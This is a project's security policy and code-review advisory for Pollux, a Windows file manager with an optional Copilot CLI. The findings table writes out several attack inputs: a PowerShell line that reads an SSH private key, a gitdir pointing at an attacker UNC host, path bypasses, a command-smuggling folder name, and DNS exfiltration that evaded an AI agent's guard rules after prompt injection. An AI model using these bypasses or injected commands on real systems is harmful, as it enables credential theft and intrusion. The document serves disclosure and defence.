# Security

## Reporting a vulnerability

Please report security issues privately, not as a public issue: use GitHub's *Report a vulnerability* (Security tab) or email the maintainer. Only the latest release is supported; fixes ship in the next release.

## Security model

| Area | What Pollux guarantees |
|---|---|
| **Network** | The Pollux process opens no network connections: no telemetry, no update check, no crash upload ([ADR 0001](docs/adr/0001-pollux-never-opens-network-connections.md)). No `HttpClient`/socket APIs are used. Exceptions run as separate processes the user starts or enables: `winget` (Updates view, automatic checks off by default), the Copilot CLI (off by default, [ADR 0005](docs/adr/0005-copilot-runs-out-of-process.md)) and network drives the user maps (SMB, with Windows' own credential prompt). |
| **Privileges** | Per-user install under `%LocalAppData%\Programs\Pollux` by default, manifest `asInvoker`, no admin rights needed. `install.ps1 -AllUsers` is an optional per-machine install to Program Files for setups where elevation is a real boundary ([ADR 0008](docs/adr/0008-optional-per-machine-install-for-the-admin-instance.md)). The optional Admin Instance asks through UAC/Delinea, runs without tray, hotkeys, keyboard hook, clipboard capture and Copilot, ignores command and terminal settings and forwarded requests, starts tools found on PATH only from the system directory or Program Files and warns when it runs from a folder a normal user can write to. |
| **Starting tools** | Every external tool (git, winget, VS Code, terminals, `cmd`, PowerShell) is started by an absolute path found on the system PATH, never from the folder being browsed or Pollux's own folder. A missing tool gives a message instead. |
| **Trusted Folders** | git runs only inside Trusted Folders you marked (including subfolders; network locations cannot be trusted), and even there not for repos whose config defines filters, drivers, includes or command settings ([ADR 0006](docs/adr/0006-git-only-runs-in-trusted-folders.md)). Elsewhere the branch is read from `HEAD` without starting a process; `.git` files pointing to network paths are ignored. |
| **Releases** | Every release publishes `SHA256SUMS` and GitHub build provenance attestations for the zips; CI actions are pinned by commit SHA, only the upload job can write, NuGet restores are locked and the bundled Copilot CLI is checked against hashes recorded in this repo. Binaries are not code-signed. See *Verifying a release* below. |
| **System changes** | HKCU only: autostart (`Run` key, on by default), optional Win+E / Win+V takeover (low-level keyboard hook that only watches those two chords, records nothing). `uninstall.ps1` restores the Win+V setting and removes the `Run` key. |
| **Data at rest** | Settings, bookmarks, workspaces in `%AppData%\Pollux` (plain JSON, roams with the profile). Recent, session, logs, WebView2 profile, Copilot action log in `%LocalAppData%\Pollux` (plain text). Clipboard History (off by default) is DPAPI-encrypted for the current user, including images; clips marked private by the source app (password managers) are never recorded. Notes are plain `.md` in `Documents\Pollux\Notes`, which corporate OneDrive Known Folder Move may sync. |
| **Logs** | `errors.log` holds exception text (may contain paths). `trace.log` is opt-in (`trace.on`) and records paths and clipboard source process names, never clipboard content. Nothing is uploaded or rotated. |
| **Embedded web views** | WebView2 with DevTools, autofill and Edge background networking (sync, SmartScreen, Translate, component updates) off. Only the local virtual hosts are allowed; all other navigation and requests are blocked. Copilot panel and editor pages have a Content-Security-Policy; Markdown is escaped, never rendered as raw HTML. HTML/SVG previews run without scripts and serve only the previewed file, with no network, frame or download access; web messages are accepted only from Pollux's own pages. |
| **Copilot** | Off by default; with it off no CLI process exists. Pollux never sees the GitHub token. Guard Rules ask before reading secrets, writing outside the Working Folder, network use, persistence, environment reads, nested shells and any shell statement they cannot analyse ([ADR 0007](docs/adr/0007-guard-rules-fail-closed-on-unanalysable-shell.md)); a Chat that read from an untrusted place (including network shares and cloud-synced folders) asks before everything but plain reads; prompts are refused while the sandbox or mode policy is unconfirmed; Plan mode and the sandbox are enforced per tool call. The CLI sends its own product telemetry to GitHub (governed by your Copilot plan / org policy). |
| **File operations** | Zip extraction rejects path traversal, never overwrites, refuses to write through links, asks before a zip bomb and keeps the Mark-of-the-Web; copies keep it too and keep EFS encryption. Recursive copy, size, compare and search never follow junctions/symlinks. Regexes have timeouts. Overwrites go through a temp file. |

## Security review 2026-10-11

Manual code review of commit `9f7a9b1` (all of `src/`, install scripts, CI workflows, dependencies) across four areas: process execution & OS integration, WebView2, Copilot guard rules, file operations / data / supply chain.

Automated checks:

- `dotnet list package --vulnerable --include-transitive`: no known vulnerable packages (Pollux.Core, Pollux.Copilot; Pollux.App needs a Windows host).
- Secret scan of tracked files and full git history: nothing found.
- Network API scan of `src/`: no network calls in Pollux's own code.
- Vendored JS: Monaco 0.57.0, xterm.js 6.0.0, no known CVEs.

### Findings

Status: every finding is fixed in v1.5 unless the Status column says otherwise. Findings are listed as reported, at commit `9f7a9b1`.

| ID | Severity | Status | Finding | Where |
|---|---|---|---|---|
| S-01 | High | fixed (v1.5) | **Browsing a folder can run code from an untrusted git repo.** The git status badge runs `git status` automatically; a repo's own `.git/config` + `.gitattributes` can define a `clean` filter that git executes. `fsmonitor` and hooks are already disabled, filters are not. | `Services/GitInfo.cs:25` |
| S-02 | High | fixed (v1.5) | **Binary planting via "Open in VS Code".** Runs `cmd /c code …` with the browsed folder as working directory; a `code.cmd`/`code.bat` in that folder runs instead of VS Code. Same for "Open in Copilot app". | `Services/Shell.cs:74-84` |
| S-03 | High | fixed (v1.5) | **Copilot can read protected secrets through PowerShell expressions** like `Get-Content (Join-Path $HOME '.ssh\id_rsa')`, string concatenation or `[IO.File]::ReadAllText(...)`; the shell parser treats them as harmless. Silent in Allow All / Assisted. | `Core/Copilot/Guards/ShellCommand.cs:349`, `GuardRules.cs:143` |
| S-04 | High | fixed (v1.5) | **Device / admin-share paths bypass protected locations and taint**: `\\?\C:\…`, `\\.\C:\…`, `\\localhost\C$\…`. | `Core/Copilot/Guards/ProtectedPaths.cs:73`, `FolderFiles.cs:104` |
| S-05 | Medium | fixed (v1.5) | **NTLM hash leak by browsing**: a `.git` *file* with `gitdir: \\attacker\x` makes Pollux access that UNC path (SMB authentication). | `Services/GitInfo.cs:66-77` |
| S-06 | Medium | fixed (v1.5) | **NTLM hash leak via Copilot**: `pollux_navigate` skips approval and accepts UNC paths, so a prompt-injected chat can make the Pollux process contact any host. | `Copilot/Tools/PolluxTools.cs:56`, `Chat/GuardRequests.cs:121` |
| S-07 | Medium | fixed (v1.5) | **HTML/SVG preview runs scripts without CSP** and maps the file's whole folder, so a malicious `.html` can read its sibling files. Exfiltration paths not covered by the request filter: WebSocket, WebRTC, iframe requests. No privileged bridge is reachable. | `Views/PreviewController.cs:17,133`, `Services/WebHost.cs:61` |
| S-08 | Medium | fixed (v1.5) | **Terminal binary planting**: "Open terminal here" starts `wt.exe` / `pwsh.exe` / `powershell.exe` by bare name with the browsed folder as working directory. (To verify on Windows.) | `Services/Shell.cs:49-71` |
| S-09 | Medium | fixed (v1.5) | **Admin Instance uses user-writable settings and binaries**: command settings (`vsCodeCommand`, `copilotAppCommand`, terminal profile) go unescaped into `cmd /c` in the elevated process; the exe lives in user-writable `%LocalAppData%`. Matters where elevation is a real boundary (standard user + Delinea). | `Services/ExtraFeatures.cs:135`, `Shell.cs:51,75` |
| S-10 | Medium | fixed (v1.5) | **Mark-of-the-Web is lost**: the built-in copy engine copies only the main data stream (drops `Zone.Identifier` and EFS), and zip extraction does not propagate MOTW. Downloaded files lose SmartScreen / Office Protected View. | `Core/Operations/TransferRunner.cs:317`, `Core/Archives/ZipArchiver.cs:209` |
| S-11 | Medium | fixed (v1.5) | **Copilot Guard Rules are denylists with gaps**: DNS exfiltration (`nslookup`, `Resolve-DnsName`), .NET network types, pipelines into `Remove-Item` outside the Working Folder, persistence (`setx`, `git config --global`) are allowed. | `Core/Copilot/Guards/GuardRules.cs` |
| S-12 | Medium | fixed (v1.5) | **Tainted Chat is too narrow**: network shares, OneDrive/SharePoint and cloned repos don't taint; junctions into Downloads aren't resolved; tools without a path argument stay unrestricted. | `Core/Copilot/Guards/UntrustedSources.cs:10`, `GuardRules.cs:190,242` |
| S-13 | Medium | fixed (v1.5) | **Missing protected credential stores**: `%AppData%\GitHub CLI\hosts.yml`, `.git-credentials`, `.npmrc`, `.docker\config.json`, `.kube\config`, `NuGet.Config`, `*.kdbx`. | `Core/Copilot/Guards/ProtectedPaths.cs` |
| S-14 | Medium | fixed (v1.5) | **Windows Terminal `;` separator**: a folder named `x; cmd /c calc` may start an extra command via `wt.exe -d`. (To verify on Windows.) | `Services/Shell.cs:50` |
| S-15 | Low | fixed (v1.5) | Helpers `git`, `winget`, `cmd.exe`, `powershell.exe` started by bare name (search order includes Pollux's own folder and current directory). | `GitInfo.cs:25`, `UpdatesWindow.cs:235,282`, `LinkTools.cs:80` |
| S-16 | Low | fixed (v1.5) | WebView2: no `DownloadStarting` handler; script dialogs and default context menus enabled; web-message handlers don't check `e.Source` or ranges (terminal input bridge). | `Services/WebHost.cs:45`, `Views/TerminalController.cs:47` |
| S-17 | Low | fixed (v1.5), except the environment: the CLI still receives your full environment (out of scope, see ADR 0005); Pollux now fails closed and Guard Rules ask before environment reads | Copilot: ADS suffix (`secret.key::$DATA`) bypasses `*.key`/`*.pfx` patterns; full environment (incl. tokens like `GH_TOKEN`) is passed to the CLI; sandbox / mode-policy failures fail open. | `Guards/ProtectedPaths.cs`, `Connection/CopilotCliEnvironment.cs`, `Chat/CopilotChat.cs:278,745` |
| S-18 | Low | fixed (v1.5), except code signing: binaries stay unsigned, verify with checksums and attestations (Authenticode planned later) | Supply chain: release binaries unsigned, no checksums or provenance; actions pinned by tag, `contents: write` at workflow level; Copilot CLI hash comes from the same release as the download; no NuGet lock file. | `.github/workflows/release.yml`, `Directory.Packages.props` |
| S-19 | Low | fixed (v1.5) | No size / ratio limit on zip extraction (zip bomb); "Extract here" writes through an existing junction in the target folder. | `Core/Archives/ZipArchiver.cs:185,205` |
| S-20 | Info | partly fixed (v1.5): the `cd /d` `%VAR%` expansion is fixed; plain-text Copilot chat list/action log and CurrentUser DPAPI scope are by design (out of scope) | Copilot chat list and action log (`%LocalAppData%\Pollux\copilot`) are plain text; DPAPI for the clipboard uses CurrentUser scope (no protection against malware running as you); `cd /d "…"` in the embedded cmd expands `%VAR%`. | — |

## Verifying a release

Each release contains `SHA256SUMS` and a build provenance attestation per zip.

```powershell
# Checksum (compare with the line for your zip in SHA256SUMS)
(Get-FileHash .\Pollux-win-x64.zip -Algorithm SHA256).Hash
# Provenance: proves the zip was built by this repository's release workflow (GitHub CLI)
gh attestation verify .\Pollux-win-x64.zip --repo <owner>/<repo>
```

Release builds are not code-signed, so AppLocker/WDAC/Smart App Control may still block them; check with IT.

## Recommendations for a corporate laptop

1. Mark only folders you trust as Trusted Folders (Settings, `files.trustedFolders`); never your Downloads or a share.
2. Where the Admin Instance matters (standard user + Delinea), use `install.ps1 -AllUsers` and verify the release first.
3. `install.ps1` is run with `-ExecutionPolicy Bypass`; use `Unblock-File` if policy forbids it.
4. Keep in mind that the Copilot CLI sees your environment variables, that notes may sync to OneDrive and that `%AppData%\Pollux` roams.
